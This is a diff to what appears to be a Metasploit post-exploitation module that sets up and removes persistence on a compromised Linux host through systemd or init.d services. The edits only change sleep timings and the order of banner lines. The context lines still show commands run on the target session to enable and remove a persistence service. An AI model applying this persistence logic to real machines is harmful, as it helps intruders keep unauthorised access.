@@ -237,7 +237,7 @@ if datastore['SYSTEMD'] == true
         Rex::sleep(1.0)
         print_good("Enable systemctl service ..")
         cmd_exec("systemctl enable persistence.service")
-        Rex::sleep(1.0)
+        Rex::sleep(1.5)
       else
         print_error("systemd script: #{serv_file} not found ..")
         print_error("Persistence on: #{rem['Computer']} not achieved ..")
@@ -342,7 +342,7 @@ else
         print_good("Update init.d service status (symlinks) ..")
         # update-rc.d persistance defaults # 97 03
         cmd_exec("update-rc.d persistance defaults")
-        Rex::sleep(1.0)
+        Rex::sleep(1.5)
       else
         print_error("init.d script: #{script_check} not found ..")
         print_error("Persistence on: #{rem['Computer']} not achieved ..")
@@ -427,7 +427,7 @@ if datastore['SYSTEMD'] == true
       Rex::sleep(1.0)
       print_good("Reloading systemctl daemon process ..")
       cmd_exec("sudo systemctl daemon-reload")
-      Rex::sleep(1.0)
+      Rex::sleep(1.5)
 
     #
     # Check systemd persiste script existance (after delete) ..
@@ -460,7 +460,7 @@ else
       #
       print_good("Deleting persistence service (symlinks) ..")
       cmd_exec("update-rc.d persistance remove")
-      Rex::sleep(1.0)
+      Rex::sleep(1.5)
       print_good("Removing script from init.d directory ..")
       cmd_exec("rm -f #{script_check}")
       Rex::sleep(1.0)
@@ -526,7 +526,6 @@ def ls_stage3
       print_line("")
       print_line(output)
       print_line("")
-      Rex::sleep(1.0)
 
   #
   # error exception funtion
@@ -558,8 +557,8 @@ def run
     print_line("    +---------------------------------------------+")
     print_line("")
     print_line("    Running on session  : #{datastore['SESSION']}")
-    print_line("    Computer            : #{sysnfo['Computer']}")
     print_line("    Target Architecture : #{sysnfo['Architecture']}")
+    print_line("    Computer            : #{sysnfo['Computer']}")
     print_line("    Target IP addr      : #{runsession}")
     print_line("    Operative System    : #{sysnfo['OS']}")
     print_line("    Payload directory   : #{directory}")
